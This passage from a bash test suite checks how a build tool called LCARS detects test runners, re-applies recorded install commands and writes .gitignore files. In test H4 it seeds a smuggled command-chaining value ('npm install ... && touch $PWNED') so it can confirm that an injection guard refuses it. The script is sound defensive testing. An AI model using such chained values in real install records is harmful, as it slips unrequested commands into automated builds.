  printf "require 'minitest/autorun'\n\nclass AddTest < Minitest::Test\n  def test_add\n    assert_equal 2, 1 + 1\n  end\nend\n" > "$d/test/add_test.rb"
  if ( cd "$d" && ruby -Itest test/add_test.rb >/dev/null 2>&1 ); then
    ok "E4b. REAL ruby: the standard-library runner runs the seeded test"
  else
    bad "E4b. the real minitest leg failed"
  fi
  v="$(fnd "$d")"
  case "$v" in unconfigured*|ready*) ok "E4c. …and the oracle sees the ruby test file" ;;
    *) bad "E4c. a real minitest suite read as '${v%%	*}'" ;; esac
else
  skip "E4. ruby — no ruby on this machine (transcript only)"
fi

# E5. PYTHON — the settled fork. `pip install pytest` HARD-FAILS on a
#     PEP-668-managed interpreter (measured on this machine), so the RECIPE the
#     PRD recommends is the standard library's runner, which needs no install at
#     all. The TABLE still admits pip/uv/poetry: what is PERMITTED and what is
#     RECOMMENDED are different questions, and plenty of machines have a venv.
if command -v python3 >/dev/null 2>&1; then
  repo="$(new_mission_repo python)"
  allow="$(allow_for "$repo" | sed -n 's/^ALLOW=//p' | tail -1)"
  if printf '%s' "pip install pytest" | grep -Eq "$allow" \
     && printf '%s' "uv add --dev pytest" | grep -Eq "$allow"; then
    ok "E5a. the python arm still PERMITS pip/uv installs"
  else
    bad "E5a. the python arm refuses a legitimate python install"
  fi
  d="$(mk realpy)"
  mkdir -p "$d/tests"
  printf 'import unittest\n\nclass T(unittest.TestCase):\n    def test_add(self):\n        self.assertEqual(1 + 1, 2)\n' > "$d/tests/test_add.py"
  if ( cd "$d" && python3 -m unittest discover -s tests >/dev/null 2>&1 ); then
    ok "E5b. REAL python3: the standard-library runner runs with ZERO install"
  else
    bad "E5b. python3 -m unittest failed on the seeded test"
  fi
  v="$(fnd "$d")"
  case "$v" in unconfigured*|ready*) ok "E5c. …and the oracle sees the python test file" ;;
    *) bad "E5c. a real unittest suite read as '${v%%	*}'" ;; esac
else
  skip "E5. python — no python3 on this machine (transcript only)"
fi

# E6. JVM — CANNOT BE EXECUTED HERE and does not pretend otherwise. The table
#     entries and the cross-arm refusals are pure string logic (proven in A);
#     the toolchain leg is honestly skipped.
if command -v gradle >/dev/null 2>&1 || command -v mvn >/dev/null 2>&1; then
  d="$(mk realjvm)"
  if ( cd "$d" && gradle init --type java-library --dsl groovy --test-framework junit-jupiter --project-name probe >/dev/null 2>&1 ); then
    ok "E6. REAL gradle: the build tool's own init seeds a test source set"
  else
    bad "E6. gradle init failed"
  fi
else
  skip "E6. jvm — no java/gradle/mvn on this machine: TRANSCRIPT ONLY, string logic proven in A"
fi

echo "== F. the scaffold arm SUCCEEDS end to end on a zero-install arm =="

# Behaviour 4, all the way through the REAL apply_declared_setup rather than the
# refusal side of it: on rust / go / ruby the scaffold ticket declares FILES and
# NO install command at all, and the arm must still complete — because completing
# means LCARS can DETECT a runner at the root afterwards, which is what gives
# ticket 2 of the same mission a real flip-flop gate instead of a waiver.
#
# Nothing here is stubbed: real `git init`, the real manifest a scaffold ticket
# would add, the real detector, the real apply path. No network, no install, no
# worker.
scaffold_ok() { # arm  setup-dir  wanted-command-fragment  label  [in-tree-seed-fn]
  local a="$1" sd="$2" want="$3" label="$4" seed="${5:-}"
  local repo; repo="$(new_mission_repo_bare "$a")"
  [ -n "$seed" ] && "$seed" "$repo"
  printf '{ "package": "", "gap": "this repo has no test system", "installCommand": "" }\n' \
    > "$TMPROOT/mf-scaffold-$a.json"
  apply_setup "$repo" "$TMPROOT/mf-scaffold-$a.json" "$sd" "" LCARS_SETUP_GREENFIELD=1
  if [ "$ASRC" = 0 ]; then
    ok "$label"
  else
    bad "$label — REFUSED (note: $ASNOTE)"
    return 1
  fi
  local cmd
  cmd="$( cd "$repo" && env LCARS_GP_ROOT="$repo" bash "$SCRIPT" greenfield-detect-cmd-test 2>&1 \
          | sed -n 's/^DETECTED=//p' | tail -1 )"
  if printf '%s' "$cmd" | grep -q "$want"; then
    ok "     …and LCARS now detects \`$cmd\` at the root — ticket 2 gets a real gate"
  else
    bad "     …but no runner is detectable afterwards (got '$cmd')"
  fi
}
# A repo with NO stack marker of its own: the scaffold ticket is the thing that
# makes it one, exactly as on the captain's day-zero repo.
new_mission_repo_bare() { # arm → a blank repo carrying an initialization mission
  local r; r="$(mktemp -d "$TMPROOT/scaf.XXXX")"
  ( cd "$r" && git init -q && git config user.email t@t && git config user.name t \
      && printf '# ctx\n' > CONTEXT.md && git add -A && git commit -qm init )
  mkdir -p "$r/.git/lcars/missions/m-001/tickets/t-scaffold"
  cat > "$r/.git/lcars/missions/m-001/state.json" <<'JSON'
{ "id": "m-001", "type": "feature", "title": "t", "stage": "implement",
  "missionType": "initialization" }
JSON
  cat > "$r/.git/lcars/missions/m-001/approved-plan.json" <<'JSON'
{ "tickets": [ { "id": "t-scaffold", "title": "establish the test system",
                 "description": "d", "acceptanceCriteria": ["a runner runs"] } ] }
JSON
  printf '%s' "$r"
}

# THE RUST SHAPE IS NOT THE OBVIOUS ONE, and this is worth stating because it
# would otherwise be discovered live. Rust's most common unit-test convention is
# `#[cfg(test)] mod tests` INSIDE the source file — and a declared setup may
# NEVER add anything under `src/` (an invariant, not a bug: declared setup adds
# TEST infrastructure, never source, and that is what stops a "test system"
# declaration from smuggling in product code). So on this arm the declared setup
# is the manifest plus a test in Cargo's INTEGRATION test directory, which lives
# outside `src/`; the skeleton itself is the worker's own in-tree work, exactly
# as on every other arm.
seed_rust_src() { mkdir -p "$1/src"; printf 'pub fn add(a: i32) -> i32 { a + 1 }\n' > "$1/src/lib.rs"; }
sd="$TMPROOT/scaf-rust"; mkdir -p "$sd/tests"
printf '[package]\nname = "app"\nversion = "0.1.0"\nedition = "2021"\n' > "$sd/Cargo.toml"
printf 'use app::add;\n\n#[test]\nfn adds() { assert_eq!(add(1), 2); }\n' > "$sd/tests/basic.rs"
scaffold_ok rust "$sd" 'cargo test' \
  "F1. rust: a scaffold declaring files and NO install command is APPLIED" seed_rust_src

# …and the src/ invariant STILL holds on this arm — a rust scaffold that tries to
# declare its inline-test source file is refused, with the invariant's own words.
sd="$TMPROOT/scaf-rust-src"; mkdir -p "$sd/src"
printf '[package]\nname = "app"\n' > "$sd/Cargo.toml"
printf 'pub fn add(a: i32) -> i32 { a + 1 }\n\n#[cfg(test)]\nmod t { #[test] fn x() {} }\n' > "$sd/src/lib.rs"
repo="$(new_mission_repo_bare rust)"
printf '{ "package": "", "gap": "g", "installCommand": "" }\n' > "$TMPROOT/mf-rust-src.json"
apply_setup "$repo" "$TMPROOT/mf-rust-src.json" "$sd" "" LCARS_SETUP_GREENFIELD=1
if [ "$ASRC" != 0 ] && printf '%s' "$ASNOTE" | grep -q 'src/'; then
  ok "F1b. …and the never-src/ invariant still holds on the rust arm"
else
  bad "F1b. the rust arm was let through src/ (rc=$ASRC note=$ASNOTE)"
fi

sd="$TMPROOT/scaf-go"; mkdir -p "$sd"
printf 'module app\n\ngo 1.21\n' > "$sd/go.mod"
printf 'package app\n\nfunc Add(a int) int { return a + 1 }\n' > "$sd/app.go"
printf 'package app\n\nimport "testing"\n\nfunc TestAdd(t *testing.T) {\n  if Add(1) != 2 { t.Fatal("no") }\n}\n' > "$sd/app_test.go"
scaffold_ok go "$sd" 'go test' \
  "F2. go: same — the toolchain's runner needs nothing installed"

sd="$TMPROOT/scaf-ruby"; mkdir -p "$sd/test"
printf 'require "rake/testtask"\n\nRake::TestTask.new do |t|\n  t.libs << "test"\nend\n' > "$sd/Rakefile"
printf "require 'minitest/autorun'\n\nclass AddTest < Minitest::Test\n  def test_add\n    assert_equal 2, 1 + 1\n  end\nend\n" > "$sd/test/add_test.rb"
scaffold_ok ruby "$sd" 'rake test' \
  "F3. ruby: a minitest scaffold (the CHOICE made and named) is APPLIED"

echo "== H. the gate-worktree RE-APPLY reads the SAME table =="

# S186 FIX ROUND 1 — THE SECOND CALL SITE. `setup_reapply_in_worktree` re-runs a
# mission's already-verified declared install inside a FRESH gate worktree
# (post-commit / full-suite / reconcile) so those gates judge the SAME
# provisioned environment the red gate did. It carried its OWN copy of the
# pre-S186 hardcoded JS pattern, so on every install-needing NON-JS arm — dotnet
# restore, bundle install, gradle — the recorded command could not match, the
# guard `|| return 0` returned SUCCESS, and the re-install was SILENTLY SKIPPED.
# The gate worktree then has no runner and the gate misjudges the environment:
# the exact failure this function was written to prevent, resurrected for five of
# the six arms S186 added. It is silent AND it returns 0, which is why 95 green
# tests never saw it.
#
# Nothing here is stubbed but the package managers themselves: a real git repo, a
# real `git worktree add`, the real record the apply path writes, and the real
# function. The PATH shims exist so "was the install actually re-run" is a FILE
# ON DISK rather than an exit code — the same reason setup_ensure_runner refuses
# to trust exit codes.
BINSHIM="$TMPROOT/binshim"; mkdir -p "$BINSHIM"
for b in dotnet bundle gem npm pnpm cargo go gradle; do
  cat > "$BINSHIM/$b" <<'SH'
#!/usr/bin/env bash
printf '%s %s\n' "$(basename "$0")" "$*" >> "${LCARS_TEST_MARK:-/dev/null}"
exit 0
SH
  chmod +x "$BINSHIM/$b"
done

reapply_fixture() { # arm  recorded-installCommand → RREPO / RWT / RMARK
  local a="$1" ic="$2"
  RREPO="$(mktemp -d "$TMPROOT/re-$a.XXXX")"
  ( cd "$RREPO" && git init -q && git config user.email t@t && git config user.name t )
  arm_marker_body "$a" > "$RREPO/$(arm_marker_file "$a")"
  ( cd "$RREPO" && printf '# ctx\n' > CONTEXT.md && git add -A && git commit -qm init )
  mkdir -p "$RREPO/.git/lcars/missions/m-001/tickets/t-scaffold"
  cat > "$RREPO/.git/lcars/missions/m-001/state.json" <<'JSON'
{ "id": "m-001", "type": "feature", "title": "t", "stage": "implement",
  "missionType": "initialization" }
JSON
  # The record the REAL apply path writes: a copy of the accepted manifest.
  printf '{ "package": "", "gap": "no runner", "installCommand": "%s" }\n' "$ic" \
    > "$RREPO/.git/lcars/missions/m-001/test-setup-applied.json"
  RWT="$TMPROOT/wt-$a.$RANDOM"
  ( cd "$RREPO" && git worktree add -q --detach "$RWT" HEAD >/dev/null 2>&1 )
  RMARK="$TMPROOT/mark-$a.$RANDOM"; : > "$RMARK"
}
reapply() { # → ROUT / RRC
  ROUT="$( cd "$RREPO" && env PATH="$BINSHIM:$SHIM:$PATH" LCARS_TEST_MARK="$RMARK" \
            LCARS_GH_BIN=true LCARS_GIT_BIN=git \
            bash "$SCRIPT" setup-reapply-test --mission m-001 "$RWT" 2>&1 )"
  RRC="$(printf '%s\n' "$ROUT" | sed -n 's/^SRRC=//p' | tail -1)"
}
rrefusals() { # → how many refusal events this mission logged
  local f="$RREPO/.git/lcars/missions/m-001/events.jsonl"
  [ -f "$f" ] || { printf 0; return 0; }
  grep -c 'test_setup_reapply_refused' "$f" | head -1
}

# H1 / H2. THE REGRESSION ITSELF. An install-needing non-JS arm's RECORDED
#          command must actually be re-applied in the gate worktree.
reapply_fixture dotnet 'dotnet restore'
reapply
if [ "$RRC" = 0 ] && grep -q '^dotnet restore' "$RMARK"; then
  ok "H1. a recorded \`dotnet restore\` IS re-applied in the gate worktree"
else
  bad "H1. the dotnet re-apply was SKIPPED (rc=$RRC, ran: $(tr '\n' ';' < "$RMARK"))"
fi

reapply_fixture ruby 'bundle install'
reapply
if [ "$RRC" = 0 ] && grep -q '^bundle install' "$RMARK"; then
  ok "H2. …and a recorded \`bundle install\` on the ruby arm"
else
  bad "H2. the ruby re-apply was SKIPPED (rc=$RRC, ran: $(tr '\n' ';' < "$RMARK"))"
fi

# H3. THE JS ARM IS UNCHANGED — the row this site already honoured still runs.
reapply_fixture js 'npm install --save-dev vitest'
reapply
if [ "$RRC" = 0 ] && grep -q '^npm install --save-dev vitest' "$RMARK"; then
  ok "H3. the js arm's re-apply is unchanged"
else
  bad "H3. the js re-apply REGRESSED (rc=$RRC, ran: $(tr '\n' ';' < "$RMARK"))"
fi

# H4. THE TWO VALIDATIONS ARE SYMMETRIC. This site re-reads a command from a
#     file on disk and hands it to `bash -c`, so the S185 metacharacter guard
#     must hold here too: a record whose first token is admissible but which
#     chains a second command is REFUSED, and — provably — NOT EXECUTED.
PWNED="$TMPROOT/pwned-reapply.$$"; rm -f "$PWNED"
reapply_fixture js "npm install --save-dev vitest && touch $PWNED"
reapply
if [ "$RRC" = 0 ] && [ ! -e "$PWNED" ] && [ ! -s "$RMARK" ] && [ "$(rrefusals)" != 0 ]; then
  ok "H4. a chained recorded install is REFUSED, NOT EXECUTED, and logged"
else
  bad "H4. metacharacter guard missing at the re-apply site (rc=$RRC pwned=$([ -e "$PWNED" ] && echo yes || echo no) ran: $(tr '\n' ';' < "$RMARK") events=$(rrefusals))"
fi

# H5. A record that does NOT match the worktree's arm is refused OUT LOUD — the
#     old silent `|| return 0` left a human nothing to read.
reapply_fixture rust 'npm install --save-dev vitest'
reapply
if [ "$RRC" = 0 ] && [ ! -s "$RMARK" ] && [ "$(rrefusals)" != 0 ]; then
  ok "H5. an off-arm recorded install is refused WITH an event, never silently"
else
  bad "H5. the off-arm refusal is still silent (rc=$RRC ran: $(tr '\n' ';' < "$RMARK") events=$(rrefusals))"
fi

# H6. A ZERO-INSTALL ARM still returns early and harmlessly: nothing recorded to
#     run, nothing run, nothing to complain about.
reapply_fixture rust ''
reapply
if [ "$RRC" = 0 ] && [ ! -s "$RMARK" ] && [ "$(rrefusals)" = 0 ]; then
  ok "H6. a zero-install arm returns early, runs nothing, logs no refusal"
else
  bad "H6. the zero-install early return changed (rc=$RRC ran: $(tr '\n' ';' < "$RMARK") events=$(rrefusals))"
fi

echo "== I. THE PYTHON ARM CLAIMS A RUNNER, NOT A MARKER =="

# S2xx (2026-10-11, MEASURED). A real run drove LCARS against a bare
# standard-library python project. `_dtc_python` claimed `pytest` on the MERE
# PRESENCE of `pyproject.toml`, so the factory recorded `pytest` as the runner
# and logged "the runner still cannot launch" in the same breath as declaring
# the test system ESTABLISHED — because pytest is a THIRD-PARTY package and is
# simply not installed on a machine with a bare interpreter (`which pytest` →
# not found, measured on this build machine).
#
# This is the dotnet arm's regression, one arm over: CLAIMING ON A MARKER. The
# cure is the dotnet arm's cure — claim only on POSITIVE EVIDENCE of a runner,
# fall through when there is none, and never invent one to fill the slot.
#
# EVERY LEG BELOW IS BEHAVIOUR: the real `detect_test_cmd` (the entry point, not
# the helper) driven against real temporary repositories on disk, and — on the
# standard-library legs — the emitted command is then ACTUALLY RUN in that repo,
# through `bash -c`, exactly as every gate runs it. A command that cannot launch
# cannot pass these.
dtc() { # repo → detect_test_cmd's answer for it
  ( bash -c '. "'"$COMMON"'" >/dev/null 2>&1; TOPLEVEL="'"$1"'"; detect_test_cmd' )
}
pyrepo() { # name → a python repo with the given pyproject body on stdin
  local d; d="$(mktemp -d "$TMPROOT/dtcpy-$1.XXXX")"
  ( cd "$d" && git init -q && git config user.email t@t && git config user.name t )
  cat > "$d/pyproject.toml"
  printf '%s' "$d"
}
py_unittest_file() { # dir → a real, passing stdlib test file
  printf 'import unittest\n\nclass T(unittest.TestCase):\n    def test_add(self):\n        self.assertEqual(1 + 1, 2)\n' > "$1"
}
# Runs the DETECTED command in the repo, the way a gate would, and reports
# whether it ran tests. Arguments stay LITERAL — never a variable the shell
# would not word-split.
runs_tests() { # repo cmd → 0 when the runner launched AND collected >0 tests
  local out
  out="$( cd "$1" && bash -c "$2" 2>&1 )" || return 1
  printf '%s' "$out" | grep -Eq '^Ran [1-9][0-9]* test' || return 1
  printf '%s' "$out" | grep -q '^OK' || return 1
  return 0
}

PYTEST_WANT='pytest "${LCARS_TESTS_DIR:-.}"'

# I1. THE CONTROL — a repo that genuinely uses pytest STILL GETS PYTEST. Four
#     shapes of real pytest evidence, so the cure cannot be "delete the arm".
d="$(pyrepo cfgtable <<'TOML'
[project]
name = "app"

[tool.pytest.ini_options]
testpaths = ["tests"]
TOML
)"
mkdir -p "$d/tests"; py_unittest_file "$d/tests/test_add.py"
got="$(dtc "$d")"
[ "$got" = "$PYTEST_WANT" ] \
  && ok "I1a. CONTROL: a [tool.pytest.ini_options] table still seeds pytest" \
  || bad "I1a. CONTROL BROKEN: a real pytest repo got '$got'"

d="$(pyrepo declared <<'TOML'
[project]
name = "app"

[project.optional-dependencies]
test = ["pytest>=8"]
TOML
)"
mkdir -p "$d/tests"; py_unittest_file "$d/tests/test_add.py"
got="$(dtc "$d")"
[ "$got" = "$PYTEST_WANT" ] \
  && ok "I1b. CONTROL: pytest DECLARED as a dependency still seeds pytest" \
  || bad "I1b. CONTROL BROKEN: a declared-pytest repo got '$got'"

d="$(pyrepo ini <<'TOML'
[project]
name = "app"
TOML
)"
printf '[pytest]\n' > "$d/pytest.ini"
got="$(dtc "$d")"
[ "$got" = "$PYTEST_WANT" ] \
  && ok "I1c. CONTROL: pytest.ini — pytest's own config file — still seeds pytest" \
  || bad "I1c. CONTROL BROKEN: a pytest.ini repo got '$got'"

d="$(pyrepo conftest <<'TOML'
[project]
name = "app"
TOML
)"
printf 'import pytest\n' > "$d/conftest.py"
got="$(dtc "$d")"
[ "$got" = "$PYTEST_WANT" ] \
  && ok "I1d. CONTROL: a conftest.py still seeds pytest" \
  || bad "I1d. CONTROL BROKEN: a conftest.py repo got '$got'"

# I1e. …and a DECLARED-but-UNINSTALLED pytest is still pytest. The repo's own
#      choice is the evidence; "is it installed here" is a different question,
#      answered honestly (and separately) by lcars_test_readiness_status.
if ! command -v pytest >/dev/null 2>&1; then
  ok "I1e. (this machine has NO pytest, and I1a-d still seeded it — the rule is the REPO's declaration, not the machine's state)"
else
  skip "I1e. pytest IS installed here, so I1a-d cannot prove the rule is machine-independent"
fi

# I2. THE DEFECT — a STANDARD-LIBRARY project must not be handed pytest, and
#     what it IS handed has to actually run. Both halves, measured.
d="$(pyrepo stdlib <<'TOML'
[project]
name = "app"
requires-python = ">=3.9"
TOML
)"
mkdir -p "$d/tests" "$d/src"
printf 'def add(a):\n    return a + 1\n' > "$d/src/app.py"
py_unittest_file "$d/tests/test_add.py"
got="$(dtc "$d")"
if printf '%s' "$got" | grep -q 'pytest'; then
  bad "I2a. a standard-library project was handed pytest anyway: '$got'"
else
  ok "I2a. a standard-library project is NOT handed pytest"
fi
if printf '%s' "$got" | grep -q 'unittest discover'; then
  ok "I2b. …it is handed the standard library's own runner"
else
  bad "I2b. …but it was not handed the stdlib runner either (got '$got')"
fi
if [ -n "$got" ] && command -v python3 >/dev/null 2>&1; then
  if runs_tests "$d" "$got"; then
    ok "I2c. …and that command REALLY RUNS and collects the repo's tests (not asserted — executed)"
  else
    bad "I2c. the seeded command did not run the repo's tests: $( cd "$d" && bash -c "$got" 2>&1 | tail -2 | tr '\n' ' ' )"
  fi
elif [ -z "$got" ]; then
  bad "I2c. nothing was seeded for a repo that HAS runnable tests"
else
  skip "I2c. no python3 on this machine — the stdlib run cannot be executed"
fi
# …and the SAME command still runs when LCARS scopes it, which is what every
# gate does. The scope is passed LITERALLY, never through an unquoted variable.
if command -v python3 >/dev/null 2>&1 && printf '%s' "$got" | grep -q 'unittest discover'; then
  if ( cd "$d" && LCARS_TESTS_DIR=tests bash -c "$got" 2>&1 | grep -q '^OK' ); then
    ok "I2d. …and it honours an explicit \$LCARS_TESTS_DIR scope"
  else
    bad "I2d. the stdlib command breaks when LCARS scopes it"
  fi
fi

# I2e. The other stdlib layout: test files at the TOP LEVEL, no tests/ dir. A
#      command scoped to `tests` would collect nothing here, so the default
#      scope must follow the evidence.
d="$(pyrepo stdlibtop <<'TOML'
[project]
name = "app"
TOML
)"
py_unittest_file "$d/test_app.py"
got="$(dtc "$d")"
if printf '%s' "$got" | grep -q 'pytest'; then
  bad "I2e. a top-level stdlib layout was handed pytest: '$got'"
elif command -v python3 >/dev/null 2>&1; then
  if runs_tests "$d" "$got"; then
    ok "I2e. a top-level stdlib layout gets a command that really runs its tests"
  else
    bad "I2e. the top-level stdlib command collected nothing (got '$got')"
  fi
else
  skip "I2e. no python3 on this machine"
fi

# I3. NO BASIS TO CLAIM → the arm FALLS THROUGH, exactly as the dotnet arm does
#     with no test project. A marker is not a runner, and inventing one to fill
#     the slot is the defect, not the cure.
d="$(pyrepo makefile <<'TOML'
[project]
name = "app"
TOML
)"
printf 'test:\n\t@echo ran\n' > "$d/Makefile"
got="$(dtc "$d")"
[ "$got" = "make test" ] \
  && ok "I3a. a pyproject with NO test evidence no longer steals the Makefile's \`make test\`" \
  || bad "I3a. the python arm took an existing arm's answer away (got '$got')"

d="$(pyrepo nothing <<'TOML'
[project]
name = "app"
TOML
)"
got="$(dtc "$d")"
[ -z "$got" ] \
  && ok "I3b. …and with nothing to claim at all it claims NOTHING (no invented runner)" \
  || bad "I3b. a bare pyproject still invented a runner: '$got'"

# I3c. tox.ini / pytest.ini were markers too, and the same rule applies: a
#      tox.ini NAMING pytest is evidence; one that does not is not.
d="$(mktemp -d "$TMPROOT/dtcpy-tox.XXXX")"
printf '[tox]\nenvlist = py311\n\n[testenv]\ndeps = pytest\ncommands = pytest\n' > "$d/tox.ini"
got="$(dtc "$d")"
[ "$got" = "$PYTEST_WANT" ] \
  && ok "I3c. a tox.ini whose testenv runs pytest still seeds pytest" \
  || bad "I3c. a pytest-running tox.ini lost its seed (got '$got')"

# I4. THE READINESS SURFACE, end to end: the stdlib repo's verdict now rests on
#     a runner that resolves, instead of on one that cannot launch.
d="$(pyrepo verdict <<'TOML'
[project]
name = "app"
TOML
)"
mkdir -p "$d/tests"; py_unittest_file "$d/tests/test_add.py"
v="$( bash -c '. "'"$COMMON"'" >/dev/null 2>&1
      TOPLEVEL="'"$d"'"
      lcars_test_readiness_status "'"$d"'/.git/lcars/config.json" >/dev/null 2>&1
      printf "%s\t%s\n" "$LCARS_TESTREADY_STATUS" "$LCARS_TESTREADY_SUGGESTION"' )"
vst="${v%%	*}"; vsg="${v#*	}"
if [ "$vst" = missing ] && printf '%s' "$vsg" | grep -q 'unittest discover'; then
  ok "I4a. readiness suggests the stdlib runner for the measured repo shape"
else
  bad "I4a. readiness still suggests '$vsg' (status $vst)"
fi
first="${vsg%% *}"
if [ -n "$first" ] && command -v "$first" >/dev/null 2>&1; then
  ok "I4b. …and the first token of that suggestion RESOLVES on this machine (the old one did not)"
else
  bad "I4b. the suggested runner's first token ('$first') does not resolve"
fi

echo "== J. THE FOUNDATION LEAVES A STACK-APPROPRIATE .gitignore =="

# MEASURED, clean room 2026-10-15: a greenfield mission built a working Python
# CLI from an empty folder and its DELIVERED COMMIT carried two
# `__pycache__/*.pyc` files. The foundation had written no `.gitignore` at all,
# and the quality floor — which judges the code, not the tree — passed it. A
# newcomer's first delivered commit must not contain build litter.
#
# The write lives on the SCAFFOLD ARM of the real `apply_declared_setup`: the one
# place that both KNOWS the repo is greenfield and has ALREADY resolved the stack
# arm for the install allowlist, so the entries come from a fact the path
# recorded rather than one re-derived later. Nothing below is stubbed — real
# `git init`, the real manifest a scaffold ticket declares, the real arm
# resolution, the real writer. No install, no network, no worker.

# The ONE entry that is unmistakably THAT arm's litter, and appears in no other
# arm's row — which is what makes "the entries match the detected stack" an
# assertion rather than a hope.
gi_token() { # arm → one literal entry
  case "$1" in
    js)     printf 'node_modules/' ;;
    python) printf '__pycache__/' ;;
    rust)   printf '*.rs.bk' ;;
    go)     printf 'go.work.sum' ;;
    dotnet) printf '[Oo]bj/' ;;
    jvm)    printf '.gradle/' ;;
    ruby)   printf '.bundle/' ;;
  esac
}
# A declared setup that is PURE test infrastructure (never src/, never a file the
# parent commit already holds) and leaves a runner LCARS can detect at the root.
gi_setup_dir() { # → a setup dir declaring tests/test_add.py
  local sd="$TMPROOT/gi-sd-py"
  mkdir -p "$sd/tests"
  printf 'import unittest\n\n\nclass AddTest(unittest.TestCase):\n    def test_add(self):\n        self.assertEqual(1 + 1, 2)\n' \
    > "$sd/tests/test_add.py"
  printf '%s' "$sd"
}
gi_manifest() { # → a manifest declaring files and NO install (the zero-install shape)
  printf '{ "package": "", "gap": "this repo has no test system", "installCommand": "" }\n' \
    > "$TMPROOT/gi-mf.json"
  printf '%s' "$TMPROOT/gi-mf.json"
}

# J1. THE MEASURED DEFECT, CURED — and resolved from the TREE, no override: a
#     python repo (pyproject in the parent commit) whose scaffold declares a
#     unittest file gets a .gitignore naming python's own litter.
gi_sd="$(gi_setup_dir)"; gi_mf="$(gi_manifest)"
repo="$(new_mission_repo python)"
apply_setup "$repo" "$gi_mf" "$gi_sd" "" LCARS_SETUP_GREENFIELD=1
if [ "$ASRC" != 0 ]; then
  bad "J1. the python scaffold was REFUSED before the .gitignore question (note: $ASNOTE)"
elif [ ! -f "$repo/.gitignore" ]; then
  bad "J1. the foundation wrote NO .gitignore — the measured defect (pyc files in the first commit)"
elif grep -Fq '__pycache__/' "$repo/.gitignore" && grep -Fq '*.py[cod]' "$repo/.gitignore"; then
  ok "J1. a greenfield python foundation writes a .gitignore that ignores __pycache__ and *.pyc"
else
  bad "J1. the .gitignore exists but does not ignore python build litter:
$(sed 's/^/         /' "$repo/.gitignore")"
fi

# J1b. …and it says WHO wrote it and WHICH stack it was written for, so the next
#      human (and the next session) can tell a seeded file from the captain's.
if [ -f "$repo/.gitignore" ] && grep -qi 'LCARS' "$repo/.gitignore" \
   && grep -q 'python' "$repo/.gitignore"; then
  ok "J1b. …and the file names LCARS as its author and python as the stack it is for"
else
  bad "J1b. the seeded .gitignore carries no provenance header"
fi

# J1c. …and the file ENDS IN A NEWLINE. A .gitignore is a file humans append to;
#      one whose last line has no terminator silently glues the next entry onto
#      it. (`$(…)` strips trailing newlines, which is exactly how this was wrong
#      once already.)
if [ -f "$repo/.gitignore" ] && [ "$(tail -c1 "$repo/.gitignore" | od -An -c | tr -d ' ')" = '\n' ]; then
  ok "J1c. …and it ends in a newline, so a human's next appended entry stands alone"
else
  bad "J1c. the seeded .gitignore does not end in a newline"
fi

# J2. AN EXISTING .gitignore THAT ALREADY COVERS THE STACK'S LITTER IS LEFT
#     BYTE-IDENTICAL. THE REGRESSION-SENSITIVE ONE.
#
#     SPEC REVISION, S298 fix round 1. This assertion used to read "an existing
#     .gitignore is left BYTE-IDENTICAL" for ANY pre-existing file, and a live
#     run disproved the premise it rested on: a repo whose only pre-existing file
#     was a three-line hand-written .gitignore (`.DS_Store`, `secrets.txt`) ran a
#     real greenfield python foundation and DELIVERED four `__pycache__/*.pyc`
#     files, silently — the original measured defect, straight back. A zero-byte
#     `.gitignore` did the same. "A file exists" was being read as "a human has an
#     opinion about __pycache__", which it is not.
#
#     So byte-identity is now asserted where it is still the RIGHT contract — a
#     repo that already ignores the litter — and the uncovered repo is asserted
#     to gain a marked block instead (J2c/J2d). The coverage question is put to
#     `git check-ignore`, never to a grep of the file, because a later
#     `!pattern` line can un-ignore an earlier one and only git knows.
#
#     Paired with a live control on the identical declaration, so neither half
#     can pass by the writer simply not firing.
gi_covered_repo() { # → a python repo whose .gitignore already covers every row
  local r; r="$(new_mission_repo python)"
  cat > "$r/.gitignore" <<'IGN'
# the captain's own, hand-written, and thorough
.DS_Store
Thumbs.db
*.swp
.env
.env.local
__pycache__/
*.py[cod]
.venv/
venv/
*.egg-info/
.pytest_cache/
.mypy_cache/
dist/
build/
IGN
  ( cd "$r" && git add -A && git commit -qm "the captain's gitignore" )
  printf '%s' "$r"
}
# The captain's own file, verbatim — the prefix every outcome must preserve.
GI_HAND='# the captain wrote this by hand
.DS_Store
secrets.txt
'
gi_uncovered_repo() { # → a python repo with the live run's hand-written file
  local r; r="$(new_mission_repo python)"
  printf '%s' "$GI_HAND" > "$r/.gitignore"
  ( cd "$r" && git add -A && git commit -qm "the captain's gitignore" )
  printf '%s' "$r"
}
gi_ignores() { # repo path → 0 if THIS repo's full ignore chain ignores that path
  ( cd "$1" && git check-ignore --no-index -q -- "$2" )
}

cov="$(gi_covered_repo)"
cov_before="$(shasum "$cov/.gitignore" | awk '{print $1}')"
apply_setup "$cov" "$gi_mf" "$gi_sd" "" LCARS_SETUP_GREENFIELD=1
cov_rc="$ASRC"; cov_out="$OUT"
cov_after="$(shasum "$cov/.gitignore" | awk '{print $1}')"
# THE CONTROL: the identical declaration on a repo whose file does NOT cover the
# litter. If this one is also untouched the writer is simply dead and J2 proves
# nothing; if the two came out identical there would be no live variable at all.
unc="$(gi_uncovered_repo)"
unc_before="$(shasum "$unc/.gitignore" | awk '{print $1}')"
apply_setup "$unc" "$gi_mf" "$gi_sd" "" LCARS_SETUP_GREENFIELD=1
unc_rc="$ASRC"; unc_out="$OUT"
unc_after="$(shasum "$unc/.gitignore" | awk '{print $1}')"

if [ "$cov_rc" != 0 ]; then
  bad "J2. the covered-repo scaffold was REFUSED before the .gitignore question (note: $ASNOTE)"
elif [ "$unc_before" = "$unc_after" ]; then
  bad "J2. CONTROL FAILED — the uncovered repo was left alone too, so 'byte-identical' proves nothing"
elif [ "$cov_before" = "$cov_after" ]; then
  ok "J2. a .gitignore that ALREADY covers the stack's litter is left BYTE-IDENTICAL (while an uncovered one on the same declaration is appended to)"
else
  bad "J2. the foundation rewrote a .gitignore that already covered everything:
$(sed 's/^/         /' "$cov/.gitignore")"
fi
# …and that untouched outcome is still RECORDED as kept.
cov_ev="$cov/.git/lcars/missions/m-001/events.jsonl"
if [ -f "$cov_ev" ] && grep -q '"type":"gitignore_kept"' "$cov_ev"; then
  ok "J2b. …and that no-op is recorded as gitignore_kept in the mission log"
else
  bad "J2b. a .gitignore left untouched was left SILENTLY — no gitignore_kept event
$(sed 's/^/         /' "$cov_ev" 2>/dev/null)"
fi

# J2c. THE LIVE DEFECT, CURED. The tester's exact repo: a short hand-written
#      .gitignore that says nothing about python. The litter must end up ignored,
#      and git — not a grep — must be the one that says so.
if [ "$unc_rc" != 0 ]; then
  bad "J2c. the uncovered-repo scaffold was REFUSED (note: $unc_rc / $ASNOTE)"
